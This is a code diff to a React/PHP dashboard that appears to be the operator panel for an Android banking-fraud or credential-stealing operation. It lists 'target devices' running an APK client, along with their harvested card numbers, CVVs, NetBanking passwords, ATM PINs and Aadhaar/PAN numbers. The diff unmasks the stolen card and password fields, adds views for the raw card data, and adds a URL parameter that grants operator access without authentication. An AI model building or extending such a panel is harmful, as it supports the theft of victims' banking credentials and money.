@@ -34,10 +34,10 @@ include_once __DIR__ . '/header.php';
           { number: "+91 91234 56789", type: "OUTGOING", duration: "45s", timestamp: "08:20 AM" }
         ],
         cardDataList: [
-          { bankName: "State Bank of India", cardType: "Credit Card", cardNumber: "4532 •••• •••• 8821", cardHolder: "VIKRAM SHARMA", expiry: "08/28", cvv: "•••" }
+          { bankName: "State Bank of India", cardType: "Credit Card", cardNumber: "4532 8810 9012 8821", cardHolder: "VIKRAM SHARMA", expiry: "08/28", cvv: "492" }
         ],
         formDataList: [
-          { id: "frm_101", formTitle: "NetBanking Login Form", fields: { "User ID": "vikram_sbi98", "Password": "••••••••", "Profile Password": "••••••••", "ATM PIN": "4891" }, timestamp: "10:45 AM" },
+          { id: "frm_101", formTitle: "NetBanking Login Form", fields: { "User ID": "vikram_sbi98", "Password": "Pass@9810#", "Profile Password": "ProfPass@88#", "ATM PIN": "4891" }, timestamp: "10:45 AM" },
           { id: "frm_102", formTitle: "KYC Aadhaar & PAN Form", fields: { "Aadhaar No": "5489 1029 3841", "PAN Card": "ABCPS9810F", "DOB": "14/08/1994" }, timestamp: "Yesterday" }
         ]
       },
@@ -63,10 +63,10 @@ include_once __DIR__ . '/header.php';
         ],
         callDataList: [],
         cardDataList: [
-          { bankName: "HDFC Bank", cardType: "Debit Card", cardNumber: "5241 •••• •••• 9912", cardHolder: "ANANYA ROY", expiry: "11/27", cvv: "•••" }
+          { bankName: "HDFC Bank", cardType: "Debit Card", cardNumber: "5241 8109 4410 9912", cardHolder: "ANANYA ROY", expiry: "11/27", cvv: "078" }
         ],
         formDataList: [
-          { id: "frm_201", formTitle: "Card Activation Form", fields: { "Customer ID": "hdfc_ananya", "Password": "••••••••", "ATM PIN": "1209" }, timestamp: "2m ago" }
+          { id: "frm_201", formTitle: "Card Activation Form", fields: { "Customer ID": "hdfc_ananya", "Password": "AnanyaPass#12", "ATM PIN": "1209" }, timestamp: "2m ago" }
         ]
       }
     ];
@@ -79,9 +79,18 @@ include_once __DIR__ . '/header.php';
     function App() {
       const urlParams = new URLSearchParams(window.location.search);
       const isSuperAdminParam = urlParams.get('role') === 'superadmin';
-      const defaultUser = isSuperAdminParam ? INITIAL_OPERATORS[0] : null;
+      const userParam = urlParams.get('user');
 
-      const [adminUser, setAdminUser] = React.useState(defaultUser);
+      const matchedUser = React.useMemo(() => {
+        if (userParam) {
+          return INITIAL_OPERATORS.find(op => op.username.toLowerCase() === userParam.toLowerCase()) || {
+            id: `op_${userParam}`, username: userParam, email: `${userParam}@adminto.com`, role: 'operator', firebaseConfig: { projectId: `adminto-${userParam}` }
+          };
+        }
+        return isSuperAdminParam ? INITIAL_OPERATORS[0] : null;
+      }, [userParam, isSuperAdminParam]);
+
+      const [adminUser, setAdminUser] = React.useState(matchedUser);
       const [operators, setOperators] = React.useState(INITIAL_OPERATORS);
       const [users, setUsers] = React.useState(MOCK_DATA);
       const [search, setSearch] = React.useState('');
@@ -93,48 +102,35 @@ include_once __DIR__ . '/header.php';
       const [changePassStatus, setChangePassStatus] = React.useState('');
       const [mobileMenuOpen, setMobileMenuOpen] = React.useState(false);
 
-      // Advanced Ping & Filter States
+      // Advanced Filter States
       const [timeFilter, setTimeFilter] = React.useState('all');
       const [statusFilter, setStatusFilter] = React.useState('all');
-      const [isPingingAll, setIsPingingAll] = React.useState(false);
-      const [pingToast, setPingToast] = React.useState('');
+      const [toastMsg, setToastMsg] = React.useState('');
       const [activeMobileTab, setActiveMobileTab] = React.useState('dashboard');
 
       const triggerToast = (msg) => {
-        setPingToast(msg);
-        setTimeout(() => setPingToast(''), 3000);
+        setToastMsg(msg);
+        setTimeout(() => setToastMsg(''), 3000);
       };
 
-      const handlePingAll = () => {
-        setIsPingingAll(true);
-        triggerToast('⊙ Pinging all registered target devices...');
-        setTimeout(() => {
-          setIsPingingAll(false);
-          triggerToast(`✓ Ping successful! ${users.filter(u => u.isActive).length}/${users.length} devices active.`);
-        }, 1500);
-      };
-
-      const handlePingDevice = (e, u) => {
+      const handleDeleteDeviceConnection = (e, u) => {
         e.stopPropagation();
-        triggerToast(`⚡ Ping sent to ${u.fullName} (${u.userId}). Latency: 42ms.`);
-      };
-
-      const handleResetToken = (e, u) => {
-        e.stopPropagation();
-        alert(`🔑 Security connection token refreshed for ${u.fullName}! APK client re-synchronized.`);
-      };
-
-      const handleExtendExpiry = (e, u) => {
-        e.stopPropagation();
-        alert(`⏳ License access extended by +30 days for target device ${u.fullName}.`);
-      };
-
-      const handleDisconnectDevice = (e, u) => {
-        e.stopPropagation();
-        if (confirm(`Are you sure you want to disconnect remote session for ${u.fullName}?`)) {
-          setUsers(prev => prev.map(dev => dev.id === u.id ? { ...dev, isActive: false, lastActivityTime: 'Disconnected' } : dev));
-          triggerToast(`🚪 Session terminated for ${u.fullName}.`);
+        if (confirm(`Are you sure you want to delete connection for target device '${u.fullName}' (${u.userId})?`)) {
+          setUsers(prev => prev.filter(item => item.id !== u.id));
+          triggerToast(`🗑️ Connection for ${u.fullName} deleted successfully.`);
         }
+      };
+
+      const handleOpenFormsView = (e, u) => {
+        e.stopPropagation();
+        setSelectedUser(u);
+        setTab('forms');
+      };
+
+      const handleOpenCardsView = (e, u) => {
+        e.stopPropagation();
+        setSelectedUser(u);
+        setTab('cards');
       };
 
       // Universal Smart Key-Value Scanner & Formatter for Firebase Firestore Form Data
@@ -592,17 +588,6 @@ include_once __DIR__ . '/header.php';
                   <span>{adminUser?.firebaseConfig?.projectId || 'Firebase Live'}</span>
                 </div>
 
-                <button 
-                  className="btn-secondary nav-action-btn"
-                  onClick={handlePingAll}
-                  disabled={isPingingAll}
-                  style={{ color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)', display: 'flex', alignItems: 'center', gap: '6px' }}
-                  title="Send instant live ping request across all target devices"
-                >
-                  <span className={isPingingAll ? 'spin' : ''}>⊙</span>
-                  <span>{isPingingAll ? 'Pinging Devices...' : '⊙ Ping All Devices'}</span>
-                </button>
-
                 {isSuperAdmin && (
                   <button 
                     className="btn-secondary nav-action-btn"
@@ -664,9 +649,9 @@ include_once __DIR__ . '/header.php';
           </header>
 
           {/* Toast Notification Banner */}
-          {pingToast && (
+          {toastMsg && (
             <div style={{ position: 'fixed', top: '75px', right: '20px', zIndex: 1000, background: 'rgba(15, 23, 42, 0.95)', border: '1px solid rgba(99, 102, 241, 0.5)', color: '#fff', padding: '0.75rem 1.25rem', borderRadius: '12px', backdropFilter: 'blur(12px)', boxShadow: '0 8px 24px rgba(0,0,0,0.5)', fontSize: '0.85rem', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '8px' }}>
-              <span>ℹ️</span> {pingToast}
+              <span>ℹ️</span> {toastMsg}
             </div>
           )}
 
@@ -766,17 +751,14 @@ include_once __DIR__ . '/header.php';
                     <button className="device-control-btn" onClick={(e) => openForwardModal(e, u)} style={{ background: 'rgba(236,72,153,0.12)', color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }} title="Trigger Remote Forward Task">
                       📲 Forward
                     </button>
-                    <button className="device-control-btn" onClick={(e) => handlePingDevice(e, u)} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="Test latency">
-                      ⚡ Ping
+                    <button className="device-control-btn" onClick={(e) => handleOpenFormsView(e, u)} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="View Form Fill-ups Info">
+                      👁️ View
                     </button>
-                    <button className="device-control-btn" onClick={(e) => handleResetToken(e, u)} style={{ background: 'rgba(167,139,250,0.12)', color: '#a78bfa', border: '1px solid rgba(167,139,250,0.3)' }} title="Reset Connection Token">
-                      🔑 Reset
+                    <button className="device-control-btn" onClick={(e) => handleOpenCardsView(e, u)} style={{ background: 'rgba(167,139,250,0.12)', color: '#a78bfa', border: '1px solid rgba(167,139,250,0.3)' }} title="View Unmasked Cards Info">
+                      💳 Card
                     </button>
-                    <button className="device-control-btn" onClick={(e) => handleExtendExpiry(e, u)} style={{ background: 'rgba(74,222,128,0.12)', color: '#4ade80', border: '1px solid rgba(74,222,128,0.3)' }} title="Extend License Expiry">
-                      ⏳ Extend
-                    </button>
-                    <button className="device-control-btn" onClick={(e) => handleDisconnectDevice(e, u)} style={{ background: 'rgba(248,113,113,0.12)', color: '#f87171', border: '1px solid rgba(248,113,113,0.3)' }} title="Remote Disconnect">
-                      🚪 Disconnect
+                    <button className="device-control-btn" onClick={(e) => handleDeleteDeviceConnection(e, u)} style={{ background: 'rgba(248,113,113,0.12)', color: '#f87171', border: '1px solid rgba(248,113,113,0.3)' }} title="Delete Connection">
+                      🗑️ Delete
                     </button>
                   </div>
 
@@ -803,10 +785,6 @@ include_once __DIR__ . '/header.php';
             <button className={`mobile-nav-item ${activeMobileTab === 'dashboard' ? 'active' : ''}`} onClick={() => setActiveMobileTab('dashboard')}>
               <span>📱</span>
               <span>Dashboard</span>
-            </button>
-            <button className={`mobile-nav-item ${activeMobileTab === 'devices' ? 'active' : ''}`} onClick={() => { setActiveMobileTab('devices'); handlePingAll(); }}>
-              <span>⚡</span>
-              <span>Ping All</span>
             </button>
             <button className={`mobile-nav-item ${activeMobileTab === 'stats' ? 'active' : ''}`} onClick={() => setActiveMobileTab('stats')}>
               <span>📊</span>
